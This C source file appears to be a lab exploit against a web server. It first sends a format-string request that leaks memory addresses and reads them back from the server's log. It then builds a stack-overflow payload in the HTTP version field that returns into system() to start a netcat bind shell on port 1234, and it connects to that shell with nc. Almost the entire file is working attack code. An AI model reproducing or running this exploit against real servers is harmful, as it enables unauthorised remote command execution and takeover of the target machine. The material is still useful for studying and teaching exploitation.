#define _GNU_SOURCE 1
#define _XOPEN_SOURCE 700
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>

/*
static int ConvertToHexStr(char * src, int srcLength, char * dst,int dstLength)
{

        if( dstLength < 2 * srcLength + 3 )
        {
                return false;             //目标串长度不够
        }

        char * pSrc, * pDst;
        pSrc = src;
        pDst = dst;

        *pDst ='0';  pDst ++;
        *pDst = 'x'; pDst ++;

        unsigned char C, R1,R2;
        for( int i = 0; i < srcLength; i ++ )
        {
                C = *pSrc;
                R1 = C  >> 4;
                R2 = C & 0x0F;
                R1 = R1 < 10 ? ('0' + R1) : ( 'A' + (R1 - 10));
                R2 = R2 < 10 ? ('0' + R2) : ( 'A' + (R2 - 10));

                *pDst = R1;   pDst ++ ;
                *pDst = R2;   pDst ++ ;
                pSrc ++;
        }

        *pDst = '\0';
        
        return true;
        
}
*/

static int connect_to(const char *hostname, const char *port)
{
	struct addrinfo hints;
	memset(&hints, 0, sizeof hints);
	hints.ai_family = PF_INET;
	hints.ai_socktype = SOCK_STREAM;

	struct addrinfo *start;
	int ret = getaddrinfo(hostname, port, &hints, &start);
	if (ret != 0)
		return -1;
	int sock = -1;
	struct addrinfo *info;
	for (info = start; info; info = info->ai_next)
	{
		sock = socket(info->ai_family, info->ai_socktype,
			      info->ai_protocol);
		if (sock == -1)
			continue;

		if (connect(sock, info->ai_addr, info->ai_addrlen) != -1)
			break;
		close(sock);
		sock = -1;
	}
	freeaddrinfo(start);
	return sock;
}

/* This sends len bytes of data over the socket. It will call send(2)
 * over and over until one of the following happens:
 * - All of the data has been sent in which case it returns len;
 * - An error occurs in which case it returns -1; or
 * - The socket is closed in which case it returns the amount sent.
 * This does _not_ work with nonblocking sockets. */
static ssize_t sendn(int sock, const void *data, size_t len)
{
	ssize_t total = 0;
	while (len)
	{
		ssize_t amount = send(sock, data, len, 0);
		if (amount == -1 && errno == EINTR)
			continue;
		if (amount == -1)
			return -1;
		if (amount == 0)
			break;
		data += amount;
		len -= amount;
		total += amount;
	}
	return total;
}

static void recv_response(int sock)
{
	char buf[4096];

	while (1)
	{
		ssize_t amount = recv(sock, buf, sizeof buf, 0);
		if (amount == -1 && errno == EINTR)
			continue;
		if (amount <= 0)
			return;
		write(fileno(stdout), buf, amount);
	}
}

int main(int argc, char *argv[])
{

/*	if (argc != 4)
	{
		fprintf(stderr, "Usage: %s hostname port file\n", argv[2]);
		return EXIT_FAILURE;
	}
*/	
//	char *address = "localhost";
//	char *port = "80";
	int sock = connect_to(argv[1], argv[2]);
	assert(sock != -1);

	char *request;
	char weapon[105];
	weapon[0] = 0xe4;
	weapon[1] = 0xb7;
	weapon[2] = 0x04;
	weapon[3] = 0x08;
	memcpy(weapon+4, "%20$s||%1168$08x", 23);
	weapon[27] = 0;
	
/* request 1 */
	asprintf(&request, "GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", weapon, argv[1]);
//	printf("weapon = %x\n", weapon);
	sendn(sock, request, strlen(request));
	recv_response(sock);
	request = NULL;
	close(sock);
	printf("\n\n");
	sleep(1);

/*	request 2 */
	
	int sock_come_on  = connect_to(argv[1], argv[2]);
        assert(sock != -1);
	asprintf(&request, "GET %s HTTP/1.1\r\nHost: %s\r\n\r\n", "/server.log", argv[1]);
	sendn(sock_come_on, request, strlen(request));
	free(request);
//	recv_response(sock_come_on);

	FILE *fp = fdopen(sock_come_on, "r");
	char line[2][1024];
	
	int which = 0;
	while(!feof(fp) && !ferror(fp) && fgets(line[which], 1024, fp))
		which = !which;
	which = !which;
	
	printf("line[%d] = %s\nline[%d] = %s\n", which, line[which], !which, line[!which]);
	fclose(fp);
	close(sock_come_on);

	char snprintf_address[17];
	char sebp[5];
	unsigned int sebp_num;
	char zhongzhuan[3];
	char zhongzhuan2[9];
	char a_snp_to_num[9];
	unsigned int snprintf_num;
	memcpy(snprintf_address, line[which]+48, 16);
//	ConvertToHexStr(line[which], 8, snprintf_address, 8);
	snprintf_address[16] = 0;
	snprintf(a_snp_to_num, 9, "%02hhx%02hhx%02hhx%02hhx", snprintf_address[7], snprintf_address[6], snprintf_address[5], snprintf_address[4]);
	a_snp_to_num[9] = 0;
	printf("snprintf = %02hhx%02hhx%02hhx%02hhx\n", snprintf_address[7], snprintf_address[6], snprintf_address[5], snprintf_address[4]);
	int i;
	for(i = 0; i < strlen(line[which]); i++)
		{
			if( line[which][i] == '|')
				break;
		}
	printf("sebp = %c%c%c%c%c%c%c%c\n", line[which][i+2], line[which][i+3], line[which][i+4], line[which][i+5], line[which][i+6], line[which][i+7], line[which][i+8], line[which][i+9]);
//	printf("test = %x\n", (line[which][i+2]-48));

	zhongzhuan[2] = 0;		
	zhongzhuan2[8] = 0;
	int j,k;
	for(j = 0, k = 0; k < 4 && j < 7 ; k++, j+=2) 	//sebp_num
		{
			zhongzhuan[0] = line[which][i+2+j]; 
			zhongzhuan[1] = line[which][i+3+j];
			sebp[k] = strtoul(zhongzhuan, NULL, 16);
			
			zhongzhuan2[j] = line[which][i+2+j];
			zhongzhuan2[j+1] = line[which][i+3+j];
			printf("sebp[%d] = %02x\n", k, (unsigned char)sebp[k]);
		}
	sebp[4] = 0;
	sebp_num = strtoul(zhongzhuan2, NULL, 16);
	snprintf_num = strtoul(a_snp_to_num, NULL, 16);
	
	printf("snprintf_num = %x\n", snprintf_num);
		
	
	
	
	printf("zhongzhuan2 = %s\nsebp = %x", zhongzhuan2, sebp_num);
	request = NULL;
	close(sock);
	printf("\n\n");
	sleep(1);


	
	

	

	
/*	sploit1 */	
	char weapon1[600];
	for(i = 0; i < 600; i++)
		weapon1[i] = ' ';
	memcpy(weapon1+568, "/bin/nc -c /bin/sh -l -p 1234 #", 31);
/*	weapon[122] = 0xf0;	//parameter to system
	weapon[123] = 0xe9;
	weapon[124] = 0xff;
	weapon[125] = 0xbf;
*/
	weapon1[114] = 0xb0;	//seip,system
	weapon1[115] = 0xe1;
	weapon1[116] = 0xec;
	weapon1[117] = 0xb7;
	
	

	weapon1[118] = 0xbf;	//fd, return of system
	weapon1[119] = 0xff;
	weapon1[120] = 0xff;
	weapon1[121] = 0xbf;

	weapon1[122] = 0x60;	//parameter of system
	weapon1[123] = 0xe6;
	weapon1[124] = 0xff;
	weapon1[125] = 0xbf;
	
	weapon1[126] = 0xf1;	//arg_8,int
	weapon1[127] = 0xff;
	weapon1[128] = 0xff;
	weapon1[129] = 0xbf;

	weapon1[130] = 0x10; 	//arg_c,int
	weapon1[131] = 0xff;
	weapon1[132] = 0xff;
	weapon1[133] = 0xbf;
//	memcpy(weapon1+120, "/xc8/xff/xff/xbf", 4);
//	memcpy(weapon1+124, "/xd9/xfc/xff/xbf/xe9/xff/xff/xbf", 8);
	weapon1[599] = 0;
	
/*	parse the address */

	for(j = 0; j < 4; j++)
	{
		weapon1[114+j] = snprintf_address[4+j];	//change to address of snprintf
		weapon1[118+j] = sebp[3-j];
		weapon1[126+j] = sebp[3-j];
		weapon1[130+j] = sebp[3-j];
	}
//	printf("change seip to : %02hhx%02hhx%02hhx%02hhx\n", weapon1[117], weapon1[116], weapon1[115], weapon1[114]);

//parse the address of the parameter
	unsigned int exit_num;
	snprintf_num -= 57568;
	exit_num = snprintf_num - 40592;
	
	char zhongzhuan4[9];
	zhongzhuan4[8] = 0;
	snprintf(zhongzhuan4, 9, "%x", snprintf_num);
	char parse_snprintf[3];
	parse_snprintf[2] = 0;
	for(j = 0, k = 0; k < 4 && j < 7 ; k++, j+=2)
		{
			parse_snprintf[0] = zhongzhuan4[j]; 
			parse_snprintf[1] = zhongzhuan4[j+1];
			weapon1[117-k] = strtoul(parse_snprintf, NULL, 16);
		}
	printf("return to address: %02hhx%02hhx%02hhx%02hhx\n", weapon1[117], weapon1[116], weapon1[115], weapon1[114]);

	char zhongzhuan5[9];
	zhongzhuan5[8] = 0;
	snprintf(zhongzhuan5, 9, "%x", exit_num);
	char parse_exit[3];
	parse_exit[2] = 0;
	for(j = 0, k = 0; k < 4 && j < 7 ; k++, j+=2)
		{
			parse_exit[0] = zhongzhuan5[j]; 
			parse_exit[1] = zhongzhuan5[j+1];
			weapon1[121-k] = strtoul(parse_exit, NULL, 16);
		}

	sebp_num -= 4680;
	sebp_num += 100;
	char zhongzhuan3[9];
	zhongzhuan3[8] = 0;
	snprintf(zhongzhuan3, 9, "%x", sebp_num);
	char parse_sebp[3];
	parse_sebp[2] = 0;
	for(j = 0, k = 0; k < 4 && j < 7 ; k++, j+=2)
		{
			parse_sebp[0] = zhongzhuan3[j]; 
			parse_sebp[1] = zhongzhuan3[j+1];
			weapon1[125-k] = strtoul(parse_sebp, NULL, 16);
		}
	printf("zhongzhuan3 = %s\n", zhongzhuan3);
	printf("redirecting to address: %02hhx%02hhx%02hhx%02hhx\n", weapon1[125], weapon1[124], weapon1[123], weapon1[122]);
	
	
	
	
//	char *addr_ptr;
//	addr_ptr = getenv("HACK");
//	printf("address:%p\n", addr_ptr);

//	recv_response(sock);
	int sock_sploit  = connect_to(argv[1], argv[2]);
    	assert(sock != -1);
	asprintf(&request, "GET %s HTTP/%s\r\nHost: %s\r\n\r\n", "/", weapon1, argv[1]);
	sendn(sock_sploit, request, strlen(request));
//	free(request);
//	recv_response(sock);
	close(sock);
	sleep(1);
	execl("/bin/nc","bin/nc", "localhost", "1234", NULL);
	free(request);
	_exit(1);
	return 0;
}

